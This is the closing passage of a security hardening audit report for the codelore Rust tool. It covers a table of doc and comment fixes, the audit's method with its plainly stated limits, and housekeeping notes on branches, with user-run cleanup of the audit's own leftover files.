| `docs/github-action.md:108-119` | Drop `knowledge-islands` from the SARIF matrix | M6 |
| `crates/codelore-cli/src/mcp.rs:1654` | `instructions` string: soften "Read-only." | M4 |
| `crates/codelore-cli/src/mcp.rs:467` | Drop `"(default: all)"` from the schema | L1 |
| `crates/codelore-lib/src/facts/mod.rs:258`, `:366`, `:391` | Name `--cache-dir`, not `--no-cache` | H5 |
| `docs/advanced-usage.md:1082`, `:1085` | Same `--no-cache` → `--cache-dir` correction | H5 |
| `docs/reports/deep_analysis_report.md` | Re-stamp 26 `Fixed (Unreleased)` rows to their shipped versions | M16 |
| `crates/codelore-lib/src/output/sarif.rs:4`, `:181` | Remove the last `/4` comment copy | L3 |
| `release.yml` (comment) | "SLSA L3" → "Build L2" | L5 |

---

## 9. Method and limits

Seven parallel audit passes over the published v0.27.0 artifacts, each producing findings independently, each running its own adversarial validation with a default verdict of REFUTED, followed by a reconciliation pass that de-duplicated overlaps and a final author re-verification of every High and load-bearing Medium directly against source — separately from the pass that produced it. Dimensions: cycle-5 High fix-verification; cycle-5 Medium/Low fix-verification; a fresh audit of the 14-commit delta; the full MCP surface; the documentation surface (docs are verdict-bearing here); the CI/Action/release/SPA surface; and a best-practices research pass against current MCP, GitHub Actions, Rust, SARIF and DuckDB guidance.

The v0.27.0 source was reconstructed from the crates.io packages (the three workspace crates, packaged at `9dd2539` per their `.cargo_vcs_info.json`) plus the non-crate tree fetched pinned to `9dd2539` from `raw.githubusercontent.com`; the two were diffed against the v0.25.1 baseline on disk to isolate the delta. De-duplications applied: the Action-injection residual was raised by two passes and filed once (H1); the trend-workflow break was raised as both a docs and a features finding and filed once (H2); the diff exit-code drift was raised by two passes and filed once (H3); the MCP read-only-claim residual and the F-ledger re-rot were each raised twice and filed once (M4, M16).

Limits, restated plainly: **nothing was compiled** — the toolchain pin is unavailable and the toolchain host is unreachable, so H4 and M1 rest on source-reading rather than a live run (both are described precisely enough to reproduce); the **negotiated MCP protocol version** is source-read, not handshake-verified (M9 would fix that permanently); and the **third-party CDN/registry** endpoints the pipeline depends on could not be exercised, though the logic around them was read. Each is a one-command check on a host with network access and a matching toolchain, and each is named at the point it matters rather than buried here.

---

## 10. Housekeeping

- **`docs/hardening-cycle-4` (`e554d74`) and `docs/hardening-cycle-5` (`646a26e`) are both still local, unpushed, and unmerged.** Cycle 4's branch is based 25+ commits back and must **not** be merged as-is (it would revert the v0.25.x–v0.27.0 delta); its report was already rescued onto cycle 5's branch. Cycle 5's report (`docs/reports/2026-08-04-hardening-cycle-5.md`) **is present on `main`** — it shipped — so that branch's unique value is only its commit history; it can be deleted once you have confirmed the file on `main` is the one you want. This cycle's report is on its own branch below.
- **This report** is committed to branch `docs/hardening-cycle-6`, based on `main` (`9dd2539`, the v0.27.0 anchor — deliberately not the in-flight fix branch), per repo convention. It is not merged to `main`.
- **The local tree carries an uncommitted trim of `docs/reports/2026-08-06-first-run-ux-review.md`** (−386/+77) and an untracked `HANDOFF.md`. Neither is touched by this report's commit; the trim is a reasonable "close out the narrative, keep the open items" edit and is yours to commit or discard.
- **The local HEAD is `fix/empty-result-message-honesty` (`438e7ea`), two commits ahead of `main`**, fixing the zero-row notice that H-class analysis flagged in prior passes (the `--min-revs 1` dead-end remedy). That is in-flight work, not audited here beyond noting it addresses a real cursor.
- **Audit artifacts** (`cl270.tar`, `delta6.diff`, `delta6.log`, patches, ~9.6 MB) were staged into `_to_delete/cycle6-audit-artifacts/`; the device bridge cannot unlink, so `rm -rf _to_delete` is yours to run.
- **Stray `.git/objects/*/tmp_obj_*` files** are up to ~20, a few more added by each bridge commit (`unlink` is refused after the object is written). Harmless; `find .git/objects -name 'tmp_obj_*' -delete` clears them.
